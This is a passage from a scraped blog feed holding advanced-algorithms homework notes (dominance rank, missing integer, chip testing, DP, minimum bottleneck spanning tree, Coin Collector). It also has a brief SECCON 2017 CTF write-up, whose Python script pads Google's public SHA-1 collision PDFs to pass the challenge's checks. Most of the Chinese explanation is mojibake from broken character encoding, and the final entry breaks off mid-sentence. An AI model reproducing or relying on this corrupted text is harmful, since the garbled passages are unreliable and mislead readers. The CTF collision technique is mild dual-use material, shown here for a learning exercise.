respectively. Given a set $S$ of $n$ points, the rank of a point $p$ in $S$ is the number of points in $S$ dominated by $p$. We want to find the rank of every point in $S$. A naiÌˆve algorithm needs $O(n2)$ time. Design a faster algorithm for this problem. ä¸€å€‹é»æ”¯é…å¦å¤–ä¸€å€‹é»ï¼Œè¡¨ç¤ºä»–çš„$x,y$éƒ½è¦æ¯”å¦å¤–ä¸€å€‹é»å¤§ï¼Œå› æ­¤å°‡æ‰€æœ‰çš„é»ç…§$x$è»¸å‡å†ªæ’åºå¾Œï¼Œæˆ‘å€‘å¯ä»¥ç¢ºå®š$x$æ˜¯éå¢çš„ï¼Œå› æ­¤è‹¥å³åŠé¢æŸé»$P_r$çš„$y$æ¯”å·¦åŠé¢æŸé»$P_l$çš„yé‚„å¤§ï¼Œå‰‡æˆ‘å€‘çŸ¥é“$P_r$æ”¯é…$P_l$ï¼ŒåŒæ™‚$P_r$ä¹Ÿæ”¯é…$P_l$æ‰€æ”¯é…çš„æ‰€æœ‰é»ã€‚ è¤‡é›œåº¦ï¼š$T(n)&#x3D;2T(n&#x2F;2)+c_1nlogn+c_2nlogn \\Rightarrow O(nlog^2n)$ ç„¶å¾Œæˆ‘ç™¼ç¾é€™æœ‰é»è ¢ï¼Œå…¶å¯¦yè»¸é å…ˆæ’åºå¥½å°±å¥½äº†ï¼Œé€™æ¨£ä½ åªè¦åšä¸€æ¬¡$O(nlogn)çš„æ’åºã€‚ æ‰€ä»¥ $T(n)&#x3D; 2T(\\frac{n}{2}) + O(n)$ è¤‡é›œåº¦ç­‰æ–¼ $O(nlogn) + O(n) &#x3D; O(nlogn)$ Algorithm äºŒç¶­æ±‚ç§©æ¼”ç®—æ³•(åˆ†æ²») Input: nå€‹äºŒç¶­å¹³é¢é»æ‰€æ§‹æˆçš„é›†åˆ$S$ï¼Œ$n\\geq 1$ Output: é›†åˆ$S$ä¸­æ‰€æœ‰é»çš„ç§©(rank) æ­¥é©Ÿ1: è‹¥$n&#x3D;1$ï¼Œå‰‡å›å‚³$S$ä¸­å”¯ä¸€ä¸€å€‹é»çš„ç§©ç‚º0ä¸¦çµæŸã€‚æ­¥é©Ÿ2: æ‰¾å‡ºæ‰€æœ‰é»çš„Xè»¸ä¸­ä½æ•¸(median)ç•«å‡ºå‚ç›´æ–¼Xè»¸çš„ç›´ç·šLï¼Œå°‡Sä¸­çš„é»åˆ†ç‚ºäºŒå€‹é›†åˆ$S_L$èˆ‡$S_R$ã€‚æ­¥é©Ÿ3: éè¿´åœ°ä½¿ç”¨äºŒç¶­æ±‚ç§©æ¼”ç®—æ³•åˆ†åˆ¥æ±‚å‡º$S_L$èˆ‡$S_R$ä¸­æ‰€æœ‰é»çš„ç§©ã€‚æ­¥é©Ÿ4: æ ¹æ“šYè»¸å€¼æ’åºæ‰€æœ‰åœ¨$S$ä¸­çš„é»ï¼Œä¾åºç”±å°è€Œå¤§æƒææ‰€æœ‰é»ï¼Œæ±‚å‡ºæ¯ä¸€å€‹åœ¨$S_R$çš„é»$i$å‰é¢æœ‰å¤šå°‘å€‹$S_L$çš„é»(è¨˜ç‚º$update_i$)ï¼Œ$rank(i) +&#x3D; update_i$ï¼Œæœ€å¾Œå›å‚³$S$ä¸­æ‰€æœ‰é»çš„ç§©ã€‚ é¡ŒäºŒ An array $A[1\\dots n]$ contains all the integers from 0 to n except one integer. It would be easy to determine the missing integer in $O(n)$ time by using an auxiliary array $B[0\\dots n]$ to record which numbers appear in A. In this problem, however, we cannot access an entire integer in A with a single operation. The elements of A are represented in binary, and the only operation we can use to access them is â€œfetch the jth bit of $A[i]$,â€ which takes constant time. Show that if we use only this operation, we can still determine the missing integer in $O(n)$ time. åˆ©ç”¨ Most significant bit (MSB) é€²è¡ŒäºŒåˆ†æœå°‹ ä¸€å€‹éè² æ•´æ•¸$n$ï¼Œæˆ‘å€‘éœ€è¦ä½¿ç”¨$\\lceil log(n+1)\\rceil$å€‹bitsä¾†è¡¨ç¤ºä»– é€™è£¡å°‡ LSB ç·¨è™Ÿç‚º 1ï¼ŒMSBç·¨è™Ÿç‚º$\\lceil log(n+1)\\rceil$ å¦‚æœæˆ‘å€‘æœ‰ä¸€ä¸²é€£çºŒçš„æ•´æ•¸$0\\sim n$ï¼Œå‰‡æœƒæœ‰ $2^{(\\lceil log(n+1)\\rceil -1)}$å€‹æ•¸å­—å°æ–¼$2^{(\\lceil log(n+1)\\rceil -1)}$ é‡é»ï¼š åœ¨ç¢ºèªç¼ºå°‘çš„æ•¸å­—æ˜¯åœ¨Aæˆ–Bå †æ™‚ï¼Œå…¶å¯¦æˆ‘å€‘ä¹Ÿæ˜¯åœ¨1 bit 1bitæ‹¼å‡ºç¼ºå°‘çš„æ•´æ•¸ï¼Œä¾‹å¦‚:å¦‚æœæˆ‘å€‘æœ‰0,1,2,4ï¼Œå‰‡æˆ‘å€‘åŸ·è¡Œæœƒå¾—åˆ°ç¼ºå°‘çš„æ•¸åœ¨Aã€Bã€Bï¼Œä¹Ÿå°±æ˜¯$011_{2}&#x3D;3_{10}$ã€‚ è¤‡é›œåº¦ï¼š$T(n) \\leq T(2 ^ { \\lceil{log(n+1)}\\rceil âˆ’ 1} âˆ’ 1) + cn$ ä»¥$\\lceil log(n+1)\\rceil$ï¼Œå³MSBï¼Œæ˜¯å¦ç‚º0ä½œæ¨™æº–å°‡æ•¸å­—åˆ†ç‚ºA(0)ï¼ŒB(1)å…©å †ï¼Œ åˆ¤æ–·Aå †çš„å¤§å°æ˜¯å¦ç‚º$2^{(\\lceil log(n+1)\\rceil -1)}$ï¼Œå¦‚æœä¸æ˜¯ï¼Œè·³åˆ°æ­¥é©Ÿ4 è¡¨ç¤ºç¼ºå°‘çš„æ•¸å­—æ‡‰è©²å‡ºç¾åœ¨Bå †ï¼Œè®“Bç‚ºæ–°çš„æœå°‹ç¯„åœï¼Œå›åˆ°ç¬¬ä¸€æ­¥ è¡¨ç¤ºç¼ºå°‘çš„æ•¸å­—æ‡‰è©²å‡ºç¾åœ¨Aå †ï¼Œè®“Aç‚ºæ–°çš„æœå°‹ç¯„åœï¼Œå›åˆ°ç¬¬ä¸€æ­¥ reference é¡Œä¸‰ Assume there are n supposedly identical VLSI chips that are capable of testing each other. There is a test jig that can accommodate two chips at a time. When the jig is loaded, each chip tests the other and reports whether it is good or bad. A good chip always reports accurately whether the other chip is good or bad, but the answer of a bad chip cannot be trusted. Show that the good chips can be identified with $O(n)$ pairwise tests, assuming that more than $\\frac{n}{2}$ of the chips are good. A says B says Conclusion B is good A is good 2 good or 2 bad B is good A is bad at least 1 bad B is bad A is good at least 1 bad B is bad A is bad at least 1 bad ï¼ˆé¡Œç›®å‡è¨­è¶…én/2ç‚ºå¥½çš„æ™¶ç‰‡ï¼‰æ­¥é©Ÿ1: å°‡å…¨éƒ¨chipå…©å…©é…å°ï¼Œç„¶å¾Œåšæ¸¬è©¦ï¼Œè‹¥ç‚ºå¥‡æ•¸ï¼Œå‰‡å¤šçš„ä¸€å€‹é€™è¼ªå…ˆé–’ç½®æ­¥é©Ÿ2: æ¨æ£„æ¸¬è©¦çµæœå‡ºç¾badçš„å…©æ™¶ç‰‡æ­¥é©Ÿ3: æ¸¬è©¦çµæœç‚ºå…©å€‹goodçš„ï¼Œæ¨æ£„å…¶ä¸­ä»»æ„ä¸€å¼µ ï¼ˆä½¿å¥½æ™¶ç‰‡çš„æ•¸é‡ç¶­æŒè¶…én/2ï¼‰æ­¥é©Ÿ4: é‡è¤‡ä»¥ä¸Šæ“ä½œç›´åˆ°å‰©ä¸‹1æˆ–2å¼µæ™¶ç‰‡ï¼Œå‰‡å‰©ä¸‹çš„æ™¶ç‰‡å¿…æ˜¯å¥½çš„å¾ä»¥ä¸Šæ“ä½œå¯å¾—åˆ°ä¸€å¼µå¥½çš„æ™¶ç‰‡ï¼Œæ•…åªè¦æ‹¿é€™å¼µæ™¶ç‰‡æ¸¬è©¦æƒ³è¦æ¸¬è©¦çš„æ™¶ç‰‡ï¼Œä¾¿å¯ä»¥é¦¬ä¸Šç¢ºå®šæ˜¯ä¸æ˜¯å¥½æ™¶ç‰‡ã€‚ ç°¡å–®è«–è­‰ï¼šè¶…é$\\frac{n}{2}$ç‚ºå¥½çš„æ™¶ç‰‡ä¸‹æœ€å·®çš„ç‹€æ³æ˜¯æœ‰$\\frac{n}{2}-1$å¼µå£æ™¶ç‰‡ï¼Œæ—¢ä½¿åœ¨æ­¤æƒ…æ³ä¸‹ï¼Œå¦‚æœæˆ‘å€‘æ•…æ„æŠŠä¸€å¼µå¥½çš„é…ä¸€å¼µå£çš„ï¼Œä¹Ÿå¿…å®šæœƒæœ‰ä¸€çµ„æ˜¯å…©å¼µçœŸæ­£å¥½çš„(è¡¨æ ¼è¡¨ç¤ºçš„æ˜¯æ™¶ç‰‡çœŸæ­£çš„ç‹€æ…‹)ï¼š A B good bad good bad good bad good good å¦‚æœæˆ‘å€‘äº‚åˆ†ï¼Œæœ‰è¶…éä¸€çµ„æ™¶ç‰‡æ˜¯äº’èª¬å¥½çš„ï¼Œæˆ‘å€‘æœƒçŸ¥é“ä¸€å®šæœ‰ä¸€çµ„æ˜¯å…©å¼µå£çš„ï¼Œä½†æ–¼æ­¤åŒæ™‚å¿…ç„¶æœƒç”¢ç”Ÿå¦å¤–ä¸€çµ„å¥½çš„ï¼š A B good bad good good bad bad good good å¦‚æœçµ„åˆ2,3,4éƒ½å›å ±ä¸€åˆ‡æ­£å¸¸ï¼Œé€™æ™‚ç…§æ¼”ç®—æ³•çš„æ­¥é©Ÿ3æŠŠæ¯å€‹é…å°ä¸­çš„ä»»ä¸€å€‹ç§»é™¤ï¼Œæ¶ˆæ¸›æ•¸é‡ä¸¦ä¸”è®“goodä¿æŒåœ¨è¶…é$\\frac{n}{2}$ï¼Œå¯ä»¥çŸ¥é“ä¸€ç›´é‡è¤‡åšä¸‹å»æœƒåªå‰©ä¸‹å¥½çš„ï¼Œå…¶å¯¦å°±æ˜¯ç°¡å–®çš„é´¿ç± åŸç†ï¼Œæˆ‘å€‘åªæœ‰$\\frac{n}{2}$å€‹é…å°æ•¸ï¼ˆç± å­ï¼‰ï¼Œä½†æ˜¯å»æœ‰è¶…é$\\frac{n}{2}$å€‹å¥½æ™¶ç‰‡ï¼ˆé´¿å­ï¼‰ï¼Œå¿…æœ‰å…©å¥½æ™¶ç‰‡åœ¨åŒä¸€å€‹é…å°ä¸­ã€‚ è¤‡é›œåº¦ï¼š$T(n) \\leq T(\\lceil{n&#x2F;2}\\rceil) + \\lfloor{n&#x2F;2}\\rfloor$ &#x3D; O(n) reference é¡Œå›› Let T and P be two sequences such that $|P| \\leq |T|$. Design a linear time algorithm to determine whether $P$ is a subsequence of $T$. æ°´é¡Œ é¡Œäº” Given a sequence $S$ of n nonnegative numbers $x_1, x_2, \\dots , x_n$, and an integer $k$, partition $S$ into $k$ or fewer consecutive subsequences such that the largest sum of these subsequences is minimized over all possible partitions. æ•´é«”æ¦‚å¿µæ˜¯äºŒåˆ†æœå°‹æ³•ï¼‹è²ªå©ªæ³•ï¼Œå…ˆè¨­å®šä¸€å€‹ä¸Šé™å€¼$(upper+lower)&#x2F;2$ï¼Œç„¶å¾Œä¾åºæŠŠæ¯ç¾¤å¡æ»¿ï¼Œå¡åˆ°ä¸è¶…éä¸Šé™å€¼ï¼Œæœ€å¾Œkç¾¤éƒ½å¡æ»¿å¾Œæª¢æŸ¥æ­¤è§£æ˜¯å¦æ­£ç¢ºï¼ˆæ¯å€‹æ•¸å­—éƒ½æœ‰è¢«å¡é€²ä¸€å€‹ç¾¤é«”è£¡é¢ï¼‰ï¼Œå¦‚æœæ­¤è§£æ­£ç¢ºçš„è©±å°± $upper\\leftarrow(upper+lower)&#x2F;2$ï¼Œä¸€ç›´åšåˆ° $lower \\geq upper$ï¼Œå°±èƒ½å¾—åˆ°æœ€å°æœ€å¤§å€¼ã€‚ 1: å…ˆæŒ‡æ´¾äºŒåˆ†æœå°‹ç”¨çš„ä¸Šä¸‹ç•Œï¼š upper = sum of elements in sequence lower = æ•´å€‹sequenceä¸­æœ€å¤§çš„å…ƒç´  ï¼ˆå¯ä»¥æŒ‡æ´¾ç‚º0ï¼Œä½†æ˜¯æœƒå¤šåšå¹¾æ¬¡ï¼‰2: æŒ‡å®šä¸€å€‹ç•Œé™ = (upper + lower)/23: æ¥ä¸‹ä¾†å¾sequenceçš„é ­é–‹å§‹åˆ†ç¾¤ï¼ˆè˜‹æœä¾åºæ”¾å…¥ç±ƒå­çš„æ¦‚å¿µï¼‰ å¦‚æœç›®å‰é€™å€‹ç¾¤å†å¤šæ”¾ä¸‹ä¸€å€‹æ•¸å­—å°±æœƒè¶…éç•Œé™çš„è©±å°±æ”¾é€²ä¸‹ä¸€å€‹ç¾¤ï¼Œç›´åˆ°æ¯å€‹ç¾¤éƒ½è£æ»¿4: æª¢æŸ¥æ˜¯ä¸æ˜¯sequenceä¸­çš„æ¯å€‹æ•¸å­—éƒ½æœ‰è¢«åˆ†åˆ°æŸä¸€ç¾¤ éƒ½æœ‰åˆ†åˆ°çš„æƒ…æ³ï¼š æŠŠupperè®Šç‚º (upper + lower)/2 å¦å‰‡ï¼š æŠŠlowerè®Šç‚º (upper + lower)/2 + 15: å¦‚æœlower &lt; upper å‰‡å›åˆ°æ­¥é©Ÿ 2 é¡Œå…­ You have inherited the publishing rights to n songs by the Raucous Rockers. You want to release a boxed set of d compact disks, each of which can hold at most m minutes of music. To satisfy the fans, you must put the songs in chronological order, but you can omit songs (regardless of when they were recorded) if necessary. Of course, no song can be split across a disk. Given a list of the song lengths in chronological order, your task is to figure out the maximum number of songs that can be recorded on the set of disks subject to these criteria. ä½ æœ‰né¦–æ­Œï¼Œç„¶å¾Œæœ‰då¼µå…‰ç¢Ÿï¼Œæ¯å€‹å…‰ç¢Ÿçµ±ä¸€æœ€å¤šæ”¾måˆ†é˜çš„éŸ³æ¨‚ï¼Œé¡Œç›®æœƒä¾ç…§å¹´ä»½çµ¦æ’åºéçš„æ­Œå–®ï¼Œè¦æ±‚åœ¨ä¾ç…§å¹´ä»½æ’åºä¸”æ¯é¦–æ­Œä¸å¯ä»¥åˆ†åœ¨å…©ç‰‡CDçš„æƒ…å½¢ä¸‹ï¼Œæ‰¾å‡ºèƒ½å­˜æ”¾æœ€å¤šé¦–æ­Œçš„çµ„åˆã€‚ å…ˆå®šç¾©DPé™£åˆ—ç‚º dp[i][j][k] è¡¨ç¤ºæœ‰ié¦–æ­Œè¦æ”¾å…¥ç¬¬jå¼µå…‰ç¢Ÿï¼Œä¸”è©²å…‰ç¢Ÿå®¹é‡ç‚ºkæ™‚æœ€å¤šå¯ä»¥æ”¾å¹¾é¦–æ­Œçš„æƒ…å½¢ï¼Œä¸¦å®šç¾©ç¬¬ié¦–æ­Œçš„é•·åº¦ç‚º minute[i]ã€‚å¦‚åŒ01èƒŒåŒ…ï¼Œå°±æ˜¯åœ¨è€ƒæ…®é€™é¦–æ­Œè©²ä¸è©²æ”¾é€²å»é€™å¼µcdçš„æƒ…å½¢ ç©ºé–“è¤‡é›œåº¦å°šæœªå„ªåŒ–çš„æ–¹æ³•ï¼š é‚Šç•Œæ¢ä»¶ï¼šDPé™£åˆ—åˆå§‹å…¨ç‚º0éè¿´é—œä¿‚ï¼š ä¸æ”¾å…¥ï¼š dp[i][j][k] = dp[i-1][j][k], if minute[i] &gt; k æ”¾å…¥æ™‚: a.å¦‚æœè¦ç•¶è©²å…‰ç¢Ÿçš„ç¬¬ä¸€é¦–æ­Œï¼Œæ‡‰è©²æ‰¾ä¸Šä¸€å¼µå…‰ç¢Ÿè£æ»¿çš„ç‹€æ…‹: dp[i-1][j-1][k]+1 b.å¦‚æœä¸æƒ³ç•¶è©²å…‰ç¢Ÿçš„ç¬¬ä¸€é¦–æ­Œï¼Œæ‡‰è©²æ‰¾è©²å…‰ç¢Ÿçš„ä¸Šä¸€é¦–æ­Œï¼š dp[i-1][j][k-minute[i]]+1 å› æ­¤å¼å­æ‡‰è©²ç‚º dp[i][j][k] = max(a,b)ç­”æ¡ˆï¼šdp[n][d][m] ç©ºé–“å„ªåŒ–çš„æ–¹æ³•å°±è·ŸèƒŒåŒ…å•é¡Œä¸€æ¨£ï¼Œåæ­£ä»–iæ˜¯è¶Šä¾†è¶Šå¤§ï¼Œæ‰€ä»¥å¯ä»¥é™ä¸€ç¶­ã€‚ è€å¸«ï¼šP[i,j] &#x3D; nï¼Œå‰ié¦–é¸äº†jé¦–ï¼Œå¯ä»¥æ”¾nå¼µå”±ç‰‡ é¡Œä¸ƒ Solve â€œBitonic Euclidean traveling-salesman problemâ€ in chapter 15 of the book [CLRS]. çµ¦ä¸€å †é»æœ‰ x, y åº§æ¨™ï¼Œè¦æ±‚è¨­è¨ˆä¸€å€‹è·¯ç·šè®“éŠ·å”®å“¡å¯ä»¥åœ¨xè»¸ä¸Šåš´æ ¼éå¢çš„åˆ°æœ€å³é‚Šçš„é»ï¼Œç„¶å¾Œåœ¨xè»¸ä¸Šåš´æ ¼éæ¸›çš„åˆ°æœ€å·¦é‚Šçš„é»ï¼Œæ¯å€‹é»éƒ½å¿…é ˆè¢«æ‹œè¨ªï¼Œæ±‚æœ€çŸ­çš„èµ°æ³•ã€‚(æ²’æœ‰ç›¸åŒçš„xåº§æ¨™) è€å¸«ï¼šå¦‚æœ $P_n$ è·Ÿ $P_{n-1}$ æ˜¯ä¸€å®šè¦é€£çš„è©±ï¼Œå°±å…ˆæŠŠé‚£å€‹é‚Šæ¶ˆæ‰ï¼ŒæŠŠå•é¡Œæ”¹æˆè§£ $P_n$ åˆ° $P_{n-1}$ è§£æ³•-è‹±æ–‡ è§£æ³•-ä¸­æ–‡ é¡Œå…« Consider the activity-selection problem appears in p.41 of unit-5. Now, assume that each given activity is associated with a positive weight. Design an algorithm to find an independent subset of activities (activities that can be allowed to use the same resource) whose sum of weights is maximized. DP é¦–å…ˆè¬›æ‰€æœ‰æ´»å‹•æŒ‰ç…§çµæŸæ™‚é–“æ’åºï¼Œç„¶å¾Œå°‡å®ƒå€‘ç·¨è™Ÿæˆ$1\\sim n$ æœ€æ¯å€‹æ´»å‹•æ‰¾å‡ºä¸€å€‹ï¼Œä¸æœƒè·Ÿä»–è¡çªï¼Œä¸”indexæœ€å¤§çš„æ´»å‹•å‡ºä¾†ï¼Œå‡è¨­ç‚º$i$ï¼Œå‰‡è¡¨ç¤ºç›®å‰é€™å€‹æ´»å‹•çµ•å°ä¸æœƒè·Ÿ$1~sim i$ç”¢ç”Ÿè¡çªï¼ˆå› ç‚ºæˆ‘å€‘æ˜¯ç…§çµæŸæ™‚é–“æ’åºï¼Œä¸å¯èƒ½ç›®å‰æ´»å‹•çš„é–‹å§‹æ™‚é–“è·Ÿ$i$æ²’æœ‰äº¤é›†ä½†æ˜¯è·Ÿ$i-1$æœ‰äº¤é›†)ã€‚ å°æ–¼æ¯å€‹æ´»å‹•ä½œé¡ä¼¼èƒŒåŒ…ç‚ºé¡Œçš„åšæ³•ï¼Œå°æ´»å‹•jæœ‰å…©ç¨®æƒ…æ³ï¼šæœ‰jåœ¨è§£ç•¶ä¸­ï¼Œæ²’æœ‰jåœ¨è§£ç•¶ä¸­ï¼Œéè¿´ä¸‹å»å¯å¾—è§£ã€‚ è§£æ³• é¡Œä¹ Solve Problem 10003 â€œCutting Sticksâ€ in the ACM web site. è‹±æ–‡é¡Œç›® ä¸­æ–‡é¡Œç›® çµ¦å®šä¸€å€‹é•·åº¦ $l$ çš„æœ¨æ£’ï¼Œå¿…é ˆå°‡å…¶åˆ‡æ–· $n$ æ¬¡ï¼Œåˆ‡æ–·çš„ä½ç½®åˆ†åˆ¥ç‚º $c_1$~ $c_n$ï¼Œ($0 &lt; c_i &lt; l$)ã€‚æ¯åˆ‡ä¸€åˆ€çš„æˆæœ¬ç‚ºã€Œåˆ‡æ–·å‰ã€è©²æœ¨æ£’çš„é•·åº¦ï¼Œæ±‚é”æˆç›®æ¨™æ‰€éœ€çš„æœ€å°æˆæœ¬ã€‚ cost[x,y] = min(i = x+1 ~ y-1) &#123; cost[x,i] + cost[i,y] + (c[y] - c[x]) &#125;(0 &lt;= x, y &lt;= n+1, c[0] = 0, c[n+1] = l)example: l = 10 n = 4c[] = 4 5 7 8The minimum cutting is 22.-1 0 5 10 15 22-1 -1 0 3 7 12-1 -1 -1 0 3 8-1 -1 -1 -1 0 3-1 -1 -1 -1 -1 0-1 -1 -1 -1 -1 -1 é¡Œå Given a list of n positive integers d1, d2, â€¦, dn, we want to efficiently determine whether there exists a simple undirected graph whose nodes have degrees precisely d1, d2, â€¦, dn. Design an algorithm to solve this problem. è²ªå©ªæ³•(æœ‰æ•¸å­¸è§£) 1. å¾degreeæœ€å¤§çš„é»é–‹å§‹ï¼Œç•¶ä½œx2. æŠŠé™¤äº†xä»¥å¤–degreeæœ€å¤§çš„å¹¾å€‹é»èˆ‡x link3. æ‰¾degreeæ¬¡å¤§çš„é»ä½œç‚ºxï¼Œå›åˆ°æ­¥é©ŸäºŒç›´åˆ°æ²’æœ‰å‰©ä¸‹ä»»ä½•ä¸€é» è€å¸«ï¼šæ”¾é€™è£¡æ‡‰è©²æ˜¯è²ªå©ª morrisâ€™s blog (p35)ErdÅ‘sâ€“Gallai_theorem é¡Œåä¸€ Given a weighted graph, find a spanning tree such that the maximal edge weight of the tree is minimized over all spanning trees. $O(|E|log|V|)$ : by Kruskalâ€™s algorithmï¼š A MST is necessarily a MBST, but a MBST is not necessarily a MST.æ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›´æ¥ç”¨ Kruskalâ€™s algorithm ä¾†æ‰¾MSTï¼ŒåŒæ™‚ä»–ä¹Ÿæœƒæ˜¯MBSTã€‚ $O(|E|)$ : by Cameriniâ€™s algorithm 1. å°‡åœ–ä¸­æ‰€æœ‰çš„é‚Šåˆ†æˆå…©åŠï¼Œå…¶ä¸­ä¸€åŠçš„æ‰€æœ‰é‚Šçš„weightéƒ½ä¸å¤§æ–¼å¦ä¸€åŠä¸­ä»»æ„ä¸€å€‹é‚Šçš„weight2. æª¢æŸ¥ä»¥weightè¼ƒå°çš„çš„åŠé‚Šå’Œæ‰€æœ‰é»çµ„åˆå‡ºçš„subgraph(G_s)ï¼š (1) if G_s is connected: ä»£è¡¨G_sçš„MBSTå°±æ˜¯Gçš„MBSTï¼Œä»¥G_sç•¶ä½œè¼¸å…¥å›åˆ°æ­¥é©Ÿ1. (2) else: å°‡å„å€‹connected compontè¦–ç‚ºä¸€å€‹super vertex (a) if åªå‰©ä¸‹2å€‹super vertexå’Œ1å€‹é‚Š: å°‡ä»–å€‘é€£æ¥å¾Œå³ç‚ºMBST (b) else: ä»¥é€™å€‹æ–°çš„åœ–G&#x27;ç•¶ä½œè¼¸å…¥å›åˆ°æ­¥é©Ÿ1. æ¼”ç®—æ³•ç­†è¨˜ - Minimum Bottleneck Spanning Tree Wikipedia - Minimum Bottleneck Spanning Tree é¡ŒåäºŒ Solve Problem 11264 â€œCoin Collectorâ€ in the ACM web site. è‹±æ–‡é¡Œç›® ä¸­æ–‡é¡Œç›® $Sum(i-1) &lt; c[i]$æ˜¯å¤šé¤˜çš„æ¢ä»¶ï¼Œå› ç‚ºæœƒè¢«ä¸Šä¸€æ­¥çš„$Sum(i) &#x3D; Sum(i-1)+c[i] &lt; c[i+1]$æ‰€è¦†è“‹ æ€è·¯ï¼šï¼ˆè²ªå©ªï¼‰1. é¢å€¼æœ€å¤§çš„ç¡¬å¹£c[n-1]å¿…é¸ã€‚ï¼ˆåè­‰ï¼šå¦‚æœå…Œæ›äº†xå…ƒå»æ²’æœ‰é¸ä¸­å®ƒï¼Œå¯çŸ¥ x &lt; c[n-1]ï¼Œæ–¼æ˜¯ç”¨ x+c[n-1] å…ƒå»å…Œæ›å¯ä»¥å¾—åˆ°ä¸€å€‹æ›´å¥½è§£ã€‚ï¼‰2. å‡è¨­Sum(i)æ˜¯c[1]~c[i]ä¸­è¢«é¸ä¸­çš„è²¨å¹£çš„é¢é¡å’Œï¼Œé‚£éº¼ä¸€å®šæœ‰Sum(i) &lt; c[i+1]ã€‚ï¼ˆåè­‰ï¼šè‹¥ Sum(i) &gt;= c[i+1]ï¼Œé‚£éŠ€è¡Œè‚¯å®šæœƒçµ¦ä»–c[i+1]é¢å€¼çš„ç¡¬å¹£ã€‚ï¼‰3. æŒ‰ç…§2.ä¸­æ‰€èªªï¼Œå¦‚æœæœ‰ Sum(i) = Sum(i-1)+c[i] &lt; c[i+1]ï¼Œé‚£éº¼c[i]å°‡è¢«é¸ä¸­ï¼Œæ§‹ç¯‰é¸å–åºåˆ—ã€‚example:n = 6c[1~n] = 1 3 6 8 15 20Sum(i) = 1 v v // é ­å°¾å…ˆé¸ Sum(i) = 1 4 v v vSum(i) = 1 4 10 v v vSum(i) = 1 4 -&gt; 11 v v v vSum(i) = 1 4 -&gt; 11 26 v v v vSum(i) = 1 4 -&gt; 11 -&gt; 20 // åˆ°åº•äº†ï¼Œé¸å–å®Œç•¢ reference","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"2017::SECCON::Write-up","slug":"2017-SECCON-Write-up","date":"2017-12-17T23:39:47.000Z","updated":"2021-03-22T19:02:39.000Z","comments":true,"path":"en/2017-SECCON-Write-up/","permalink":"http://blog.terrynini.tw/en/2017-SECCON-Write-up/","excerpt":"","text":"SHA-1 is dead - 100 point SHA-1 is dead http://sha1.pwn.seccon.jp/ Upload two files satisfy following conditions: file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) &lt;&gt; SHA256(file2) 2017KiB &lt; sizeof(file1) &lt; 2018KiB 2017KiB &lt; sizeof(file2) &lt; 2018KiB * 1KiB = 1024 bytes Just download sha1 collision pdf made by Google, then concatenate it with something.Actually we donâ€™t need to check the result of SHA-256 of two pdfâ€¦â€¦Maybe wa can find a SHA-256 collision? import requestsimport urllib2from hashlib import sha1from hashlib import sha256import urllibpdf1 = urllib2.urlopen(&quot;http://shattered.io/static/shattered-1.pdf&quot;).read()[:500]pdf2 = urllib2.urlopen(&quot;http://shattered.io/static/shattered-2.pdf&quot;).read()[:500]pdf1 = pdf1.ljust( 2065409, &quot;\\00&quot;) #padding pdf to 2017Kib + 1pdf2 = pdf2.ljust( 2065409, &quot;\\00&quot;)while True: check1 = sha256(pdf1).hexdigest() check2 = sha256(pdf2).hexdigest() if check1 != check2: break else: pdf1 = pdf1+&quot;\\00&quot; pdf2 = pdf2+&quot;\\00&quot;file1 = open(&quot;upload1&quot;,&quot;w&quot;)file2 = open(&quot;upload2&quot;,&quot;w&quot;)file1.write(pdf1)file2.write(pdf2)print sha1(pdf1).hexdigest()print sha1(pdf2).hexdigest()print sha256(pdf1).hexdigest()print sha256(pdf2).hexdigest()print len(pdf1)print len(pdf2)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"SECCON","slug":"SECCON","permalink":"http://blog.terrynini.tw/tags/SECCON/"}]},{"title":"Advance-Algorithm::homework3","slug":"Advance-Algorithm-homework3","date":"2017-11-15T10:40:25.000Z","updated":"2020-07-05T12:54:35.000Z","comments":true,"path":"en/Advance-Algorithm-homework3/","permalink":"http://blog.terrynini.tw/en/Advance-Algorithm-homework3/","excerpt":"No I didnâ€™t backup problemsâ€¦","text":"No I didnâ€™t backup problemsâ€¦","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework2","slug":"Advance-Algorithm-homework2","date":"2017-11-14T17:58:55.000Z","updated":"2020-07-05T13:03:56.000Z","comments":true,"path":"en/Advance-Algorithm-homework2/","permalink":"http://blog.terrynini.tw/en/Advance-Algorithm-homework2/","excerpt":"","text":"problem 3 Given an integer (not necessary a decimal number) with n digits, we want to remove $m (\\le n)$ digits from this number such that the resulting number is as large as possibe. Design an $O(n)$ time algorithm to solve it. problem 4 Given a 2-dimensional nï‚´n array (or matrix) of 0&#x2F;1 integers, design a linear time algorithm to find a sub-square (a sub-square matrix with consecutive indices in both dimensions) with the largest size such that all the elements in the sub-square are equal to 1. problem 5 Use the standard divide-and-conquer stratege to solve the max substring sum problem discussed in Unit 4; i.e. divide the given sequence evenly and then solve the two subproblems recursively. Is it still possible to solve the problem in linear time? problem 6 Let x1, x2, â€¦ , xn be a sequence of real numbers (not necessarily positive). Design an algorithm to find a substring xi , xi+1, â€¦, xj such that the product of the numbers in it is maximum over all substrings. The product of the empty substring is defined as 1. problem 7 Given a sequence of real numbers x1, x2, â€¦, xn (not necessarily positive), n ï‚³ 1, and an integer L, 1 ï‚£ L ï‚£ n, design an algorithm to find a substring xi, xi+1, â€¦, xj such that its length jï€­i+1ï‚£ L and the sum of the numbers in it is maximum over all substrings with length not greater than L. Your algorithm should run in O(n) time (note: not O(nL)). problem 8 Given a sequence of objects where each object is associated with a value and a weight, design an algorithm to find a subsequence such that its corresponding value sequence is increasing and its weightsâ€™ sum is maximized. problem 9 Design an algoritm to solve Problem 10154 â€œWeights and Measuresâ€ in the web site: http://acm.uva.es/problemset/. problem 10 Given a 2-dimensional nï‚´n matrix M of real numbers, design an efficient algorithm to find a sub-rectangle such that the sum of the numbers in it is maximal over all sub-rectangles of M. Here, each sub-rectangle is an n1ï‚´n2 (1ï‚£ n1, n2 ï‚£ n) matrix with 